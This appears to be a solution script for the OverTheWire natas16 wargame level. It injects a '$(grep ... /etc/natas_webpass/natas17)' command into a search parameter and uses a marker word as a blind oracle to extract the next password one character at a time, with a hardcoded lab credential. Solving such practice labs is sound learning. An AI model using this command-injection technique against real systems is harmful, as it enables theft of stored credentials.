import requests
import urllib
from requests.auth import HTTPBasicAuth

#auth_header = {'Authorization':'Basic WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'}
charset = map(chr, range(65,91) + range(97,123) + range(48,58))

def make_url(substr):
	needle = "%24(grep%20-E%20^"+substr+".*%20%2Fetc%2Fnatas_webpass%2Fnatas17)zucchini"
	#needle = urllib.quote_plus("$(grep -E ^"+substr+".* /etc/natas_webpass/natas17)OTW")
	print "NEEDLE"+needle
	return "http://natas16.natas.labs.overthewire.org/index.php?needle="+needle+"&submit=Search"

def is_success(passwrd):
	resp = requests.get(make_url(passwrd), auth=HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
	#print resp.text
	if "zucchini" in resp.text:
		return False
	else:
		return True
	#return "zucchini" in resp.text

count=0
passwd=""
while count<32:
	for i in charset:
		passwd += i
		if is_success(passwd):
			print "Password so far is: ", passwd
			count +=1
			break
		else:
			passwd = passwd[:-1]
print "SUCCESS! Password: ",passwd

